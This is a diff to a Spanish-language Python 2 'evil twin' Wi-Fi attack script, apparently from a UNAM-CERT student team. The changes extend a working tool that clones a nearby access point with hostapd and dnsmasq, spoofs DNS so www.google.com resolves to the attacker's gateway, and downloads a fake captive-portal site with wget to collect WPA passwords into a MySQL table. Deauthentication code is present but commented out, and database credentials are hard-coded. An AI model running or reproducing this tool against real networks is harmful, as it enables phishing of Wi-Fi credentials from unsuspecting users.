@@ -2,7 +2,7 @@
 # -*- encoding: utf-8 -*-
 #UNAM-CERT
 #Integrantes:
-#Pedro Rdriguez
+#Pedro Alejandro Rdriguez Gallardo
 #Leal Gonzalez Ignacio
 
 import argparse
@@ -18,6 +18,12 @@ import threading
 #import netifaces
 import pip
 import shutil
+
+#Variables para base de datos:
+base      = "eviltwinattack"
+usuario   = "becario"
+password  = "hola123.,"
+table     = "wpa_pass"
 
 def addOptions():
     '''
@@ -47,7 +53,7 @@ def addOptions():
 
 def addOptionsFile(configfile):
     '''
-    Funcion que parsea los datos que se tomen de un archivo como opciones para ejecutar el programa, recibe el nombre 
+    Funcion que parsea los datos que se tomen de un archivo como opciones para ejecutar el programa, recibe el nombre
     del archivo del que se obtendrán las opciones de ejecucion y devuelve una tupla cuyos atributos son las opciones de ejecucion
     '''
     config = ConfigParser.ConfigParser()
@@ -79,13 +85,12 @@ bssid_list = []
 enc_list = []
 networks = {} # dictionary to store APs
 interface_list = [] # Lista para interfaces
-# Beacons and ProbeResponses.
 
 def restartMysql():
     '''
     Funcion para reiniciar MySQL
     '''
-    os.system("service mysql start >/dev/null") 
+    os.system("service mysql start >/dev/null")
 
 def restartApache():
     '''
@@ -116,8 +121,8 @@ def packagePipVerify(package):
     '''
     import importlib
     try:
-        importlib.import_module(package)   
-    except ImportError:       
+        importlib.import_module(package)
+    except ImportError:
         print "Instalando " + package
 	pip.main(['install', 'netifaces'])
     finally:
@@ -137,6 +142,7 @@ def verifyPackage():
             proc = subprocess.Popen('apt install -y ' + cmd, shell=True, stdin=None, stdout=open("/dev/null", "w"), stderr=None, executable="/bin/bash")
             proc.wait()
 
+# Beacons and ProbeResponses.
 def sniffAP(p):
     '''
     Funcion que realiza el escaneo de los Access Point que se encuentran cerca.
@@ -223,7 +229,7 @@ def monitor_iface(target_interface):
         print "La interface %s no existe" % (target_interface)
         sys.exit()
     os.system("airmon-ng start %s 1>/dev/null" % (target_interface))
-    interface = str(target_interface)
+    interface = str(target_interface)+'mon'
     return interface
 
 def iface_txpower(interface,mode,txpower):
@@ -234,24 +240,28 @@ def iface_txpower(interface,mode,txpower):
     if mode == "interactivo":
         target_txpower = raw_input('\n¿Deseas incrementar la potencia de tu antena a 30dB? (s/n)')
         if target_txpower == 's':
+            print "\nCambiando la potencia de la %s ..." % (interface)
             os.system("ifconfig %s down" % (interface))
             os.system("iw reg set GY") #GY o BO
             os.system("ifconfig %s up" % (interface))
             os.system("iwconfig %s txpower 30" % (interface))
+            os.system("iw %s info" % interface)
         elif target_txpower == 'n':
             pass
     elif txpower == None:
-        pass 
+        pass
     else:
         #print "iface_txpower args"
+        print "\nCambiando la potencia de la %s ..." % (interface)
         os.system("ifconfig %s down" % (interface))
         os.system("iw reg set GY") #GY o BO
         os.system("ifconfig %s up" % (interface))
         os.system("iwconfig %s txpower %s" % (interface,str(txpower)))
+        os.system("iw %s info" % interface)
 
 def run_dnsmasq(interface,first_ip,last_ip,mask,gateway):
     '''
-    Funcion que realiza la configuracion del dnsmasq y la guarda en un archivo, creacion del pool de direccioes para 
+    Funcion que realiza la configuracion del dnsmasq y la guarda en un archivo, creacion del pool de direccioes para
     asignar mediante DHCP y ejecucion de dnsmasq
     '''
     # Colocamos la informacion que ira en el archivo de configuracion dnsmasq.conf
@@ -275,7 +285,8 @@ def run_dnsmasq(interface,first_ip,last_ip,mask,gateway):
     outF.close()
 
     # Creamos DHCP con dnsmasq
-    gateway_dhcp = ['ifconfig '+interface+' '+gateway+' netmask '+mask,
+    gateway_dhcp = ['echo '+gateway+' www.google.com > dnsspoof.conf',
+                    'ifconfig '+interface+' '+'up '+gateway+' netmask '+mask,
                     'iptables --flush',
                     'iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE',
                     'iptables --append FORWARD --in-interface '+interface+' -j ACCEPT',
@@ -296,11 +307,12 @@ def run_dnsmasq(interface,first_ip,last_ip,mask,gateway):
       os.system(line)
     outF.close()
     # Subproceso
+    print "\nCreando DHCP para el AP Falso"
     p = subprocess.Popen(["xterm", "-e", "dnsmasq", "-C", "./dnsmasq.conf", "-d"])
 
 def conf_dnsmasq(mode,interface,first_ip,last_ip,mask,gateway):
     '''
-    Funcion que realiza la configuracion del pool de direcciones para DHCP, direccion IP de inicio, direccion IP final, 
+    Funcion que realiza la configuracion del pool de direcciones para DHCP, direccion IP de inicio, direccion IP final,
     gateway y mascara, ya sea de modo interactivo o por medio de paso de parametros.
     '''
     dnsmasq_text = []
@@ -323,7 +335,7 @@ def conf_dnsmasq(mode,interface,first_ip,last_ip,mask,gateway):
 
 def run_rogueAP(interface,channel,essid):
     '''
-    Funcion que crea un access point falso con los parametros seleccionados por el usuario, por medio del comando 
+    Funcion que crea un access point falso con los parametros seleccionados por el usuario, por medio del comando
     hostapd
     '''
     hostapd_text = ['interface='+interface,
@@ -342,6 +354,7 @@ def run_rogueAP(interface,channel,essid):
       outF.write("\n")
     outF.close()
     # Subproceso
+    print "\nCreando AP falso..."
     p = subprocess.Popen(["xterm", "-e", "hostapd", "./hostapd.conf"])
 
 def rogueAP(interface,channel,essid,mode):
@@ -358,11 +371,12 @@ def rogueAP(interface,channel,essid,mode):
         print "run_rogueAP in args or file mode"
         run_rogueAP(interface,channel,essid)
 
-def dnssnoof(interface):
+def dnsspoof(interface):
     '''
     Creacion de un DNS spoofing
     '''
-    p = subprocess.Popen(["xterm", "-e", "dnsspoof", "-i", interface])
+    print "\nRedireccionando el trafico a la pagina falsa..."
+    p = subprocess.Popen(["xterm", "-e", "dnsspoof", "-i", interface, "-f", "./dnsspoof.conf"])
 
 def desAuthentication(interface,bssid):
     '''
@@ -416,21 +430,21 @@ def use_modeI(mode):
     essid = networks[bssid][0]
     # Llamamos a la funcion rogueAP() para crear nuestro RogueAP
     rogueAP(interface,channel,essid,mode)
-    # Llamamos a la funcion desAuthentication()
-    desAuthentication(interface,bssid)
     # Llamamos a la funcion conf_dnsmasq() para crear DHCP que usara RogueAP
     conf_dnsmasq(mode,interface,first_ip,last_ip,mask,gateway)
-    # Llamamos la funcion dnssnoof() para redirigir a nuetra Fake page
-    dnssnoof(interface)
+    # Llamamos la funcion dnsspoof() para redirigir a nuetra Fake page
+    dnsspoof(interface)
+    # Llamamos a la funcion desAuthentication()
+    #desAuthentication(interface,bssid)
     creacionSitio()
 
 def use_modeAF(mode, interface, bssid, essid, channel, txpower, first_ip, last_ip, mask, gateway):
     '''
     Funcion para el modo de ejecucion args o file.
     '''
-    target_interface = chose_iface(interface)
+    #target_interface = chose_iface(interface)
     #Cambiamos a modo: Monitor
-    interface = monitor_iface(target_interface)
+    interface = monitor_iface(interface)
     # Cambair la potencia de la antena.
     iface_txpower(interface,mode,txpower)
     # Limpiamos la terninal antes de mostrar los resultados
@@ -438,11 +452,11 @@ def use_modeAF(mode, interface, bssid, essid, channel, txpower, first_ip, last_i
     # Llamamos a la funcion rogueAP() para crear nuestro RogueAP
     rogueAP(interface,channel,essid,mode)
     # Llamamos a la funcion desAuthentication()
-    desAuthentication(interface,bssid)
+    dnsspoof(interface)
+    #desAuthentication(interface,bssid)
     # Llamamos a la funcion conf_dnsmasq() para crear DHCP que usara RogueAP
     conf_dnsmasq(mode,interface,first_ip,last_ip,mask,gateway)
-    # Llamamos la funcion dnssnoof() para redirigir a nuetra Fake page
-    dnssnoof(interface)
+    # Llamamos la funcion dnsspoof() para redirigir a nuetra Fake page
     creacionSitio()
 
 def use():
@@ -469,12 +483,12 @@ def use():
     print ""
     print "---- args ----\n"
     print "   -i,     --interface    Interface de red inalambrica a utilizar."
-    print "   -bssid, --bssid        Direccion MAC de AP a clonar"
-    print "   -essid, --essid        Nombre del AP a clonar"
+    print "   -b,     --bssid        Direccion MAC de AP a clonar"
+    print "   -e,     --essid        Nombre del AP a clonar"
     print "   -c,     --channel      Canal que ocupara la antena inalambrica"
     print "   -p,     --txpower      Potencia de la antena [unicamente 30 :(]"
-    print "   -f_ip,  --first_ip     Primer IP del pool DHCP"
-    print "   -l_ip,  --last_ip      Ultima IP del pool DHCP"
+    print "   -f,     --first_ip     Primer IP del pool DHCP"
+    print "   -l,     --last_ip      Ultima IP del pool DHCP"
     print "   -m,     --mask         Mascara de red"
     print "   -g,     --gateway      Gateway a utilizar"
     print ""
@@ -485,8 +499,12 @@ def creacionSitio():
     Creacion de un sitio web falso, para obtener las credenciales del access point
     '''
     os.system("rm -rf /var/www/html/*")
-    os.system("wget https://www.shellvoide.com/media/files/rogueap.zip")
-    os.system("unzip rogueap.zip -d /var/www/html/")
+    os.system("wget https://github.com/Nach95/EvilTwin/raw/master/rogueap.zip 1>/dev/null")
+    #os.system("wget https://www.shellvoide.com/media/files/rogueap.zip")
+    os.system("unzip rogueap.zip -d /var/www/html/ 1>/dev/null")
+    #os.system("mv rogueap/* /var/www/html/")
+    os.system("chown www-data:www-data /var/www/html/*")
+    print "\nCreacion del sitio web falso..."
     restartApache()
 
 if __name__ == "__main__":
@@ -495,12 +513,12 @@ if __name__ == "__main__":
     '''
     validaciones()
     opts = addOptions()
-    if opts.cdb != None and len(sys.argv) == 2:
+    if opts.cdb != None: #and len(sys.argv) == 5:
         print "Creando base de datos..."
-        #c_database()
-    elif opts.ddb != None and len(sys.argv) == 2:
+        create_db(usuario, password, base, table)
+    elif opts.ddb != None: #and len(sys.argv) == 5:
         print "Borrando base de datos"
-        #d_database()
+        delete_db(base, usuario)
     #Modo de ejecucion interactivo
     elif opts.mode == "interactivo":
         print "Mode: Interactivo"
@@ -512,7 +530,7 @@ if __name__ == "__main__":
     #Modo de ejecucion file
     elif opts.mode == 'file':
         print "Mode: file"
-        opts = addOptionsFile(opts.config)        
+        opts = addOptionsFile(opts.config)
         use_modeAF(opts[0].mode, opts[0].interface, opts[0].bssid, opts[0].essid, opts[0].channel, opts[0].txpower, opts[0].first_ip, opts[0].last_ip, opts[0].mask, opts[0].gateway)
     #Ejemplo de como ejecutar el programa
     else:
@@ -523,12 +541,12 @@ Mode interactivo: python evil.py -u interactivo
 Mode args: python evil.py -u args -i wlan0 -b 18:4A:6F:6C:E2:88 -e INFINITUMFDCA -c 8 -f 192.170.0.100 -l 192.170.0.150 -m 255.255.255.0 -g 192.170.0.1 -p 0
 Mode file: python evil.py -u file -F archivo.conf -i wlan0
 
-Nota: Si utilizas una a ntena Tp-link wn722N v3, sigue los siguientes pasos:
+Nota: Si utilizas una antena Tp-link wn722N v3, sigue los siguientes pasos:
 #apt update && apt upgrade
 #apt install -y bc linux-headers-amd64
 #git clone https://github.com/kimocoder/rtl8188eus.git
-#cd rtl8188eus 
+#cd rtl8188eus
 #cp realtek_blacklist.conf /etc/modprobe.d
-#make 
+#make
 #make install
 '''
